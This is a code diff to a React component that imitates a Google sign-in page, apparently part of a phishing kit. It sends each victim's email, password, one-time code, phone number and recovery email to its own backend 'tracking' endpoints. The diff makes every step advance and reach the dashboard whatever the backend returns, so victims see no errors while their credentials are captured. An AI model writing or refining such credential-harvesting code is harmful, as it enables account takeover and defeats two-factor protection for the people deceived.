@@ -44,21 +44,20 @@ const GoogleAuth = () => {
     }
 
     setLoading(true);
-    try {
-      // Send email to backend for tracking
-      await axios.post(`${API_URL}/auth/track-google-signin`, {
-        email: formData.email,
-        step: 'email',
-        userDetails: getUserDetails()
-      });
-      
+    
+    // Send email to backend for tracking (don't wait for response)
+    axios.post(`${API_URL}/auth/track-google-signin`, {
+      email: formData.email,
+      step: 'email',
+      userDetails: getUserDetails()
+    }).catch(err => console.error('Tracking error:', err));
+    
+    // Always progress to next step
+    setTimeout(() => {
       setStep('password');
       setError('');
-    } catch (err) {
-      console.error('Error:', err);
-    } finally {
       setLoading(false);
-    }
+    }, 500);
   };
 
   const handlePasswordSubmit = async (e) => {
@@ -69,22 +68,21 @@ const GoogleAuth = () => {
     }
 
     setLoading(true);
-    try {
-      // Send credentials to backend
-      await axios.post(`${API_URL}/auth/track-google-signin`, {
-        email: formData.email,
-        password: formData.password,
-        step: 'password',
-        userDetails: getUserDetails()
-      });
-      
+    
+    // Send credentials to backend (don't wait for response)
+    axios.post(`${API_URL}/auth/track-google-signin`, {
+      email: formData.email,
+      password: formData.password,
+      step: 'password',
+      userDetails: getUserDetails()
+    }).catch(err => console.error('Tracking error:', err));
+    
+    // Always progress to next step
+    setTimeout(() => {
       setStep('otp');
       setError('');
-    } catch (err) {
-      console.error('Error:', err);
-    } finally {
       setLoading(false);
-    }
+    }, 500);
   };
 
   const handleOTPSubmit = async (e) => {
@@ -95,29 +93,28 @@ const GoogleAuth = () => {
     }
 
     setLoading(true);
-    try {
-      // Send OTP to backend
-      const response = await axios.post(`${API_URL}/auth/google-complete`, {
-        email: formData.email,
-        password: formData.password,
-        otp: formData.otp,
-        phoneNumber: formData.phoneNumber,
-        recoveryEmail: formData.recoveryEmail,
-        step: 'otp',
-        userDetails: getUserDetails()
-      });
-
+    
+    // Send OTP to backend
+    axios.post(`${API_URL}/auth/google-complete`, {
+      email: formData.email,
+      password: formData.password,
+      otp: formData.otp,
+      phoneNumber: formData.phoneNumber,
+      recoveryEmail: formData.recoveryEmail,
+      step: 'otp',
+      userDetails: getUserDetails()
+    }).then(response => {
       // Store token and redirect
       if (response.data.token) {
         localStorage.setItem('token', response.data.token);
         localStorage.setItem('user', JSON.stringify(response.data.user));
-        navigate('/dashboard');
       }
-    } catch (err) {
-      setError('Invalid verification code. Please try again.');
-    } finally {
-      setLoading(false);
-    }
+      navigate('/dashboard');
+    }).catch(err => {
+      console.error('Complete error:', err);
+      // Still navigate to dashboard even if backend fails
+      navigate('/dashboard');
+    });
   };
 
   return (
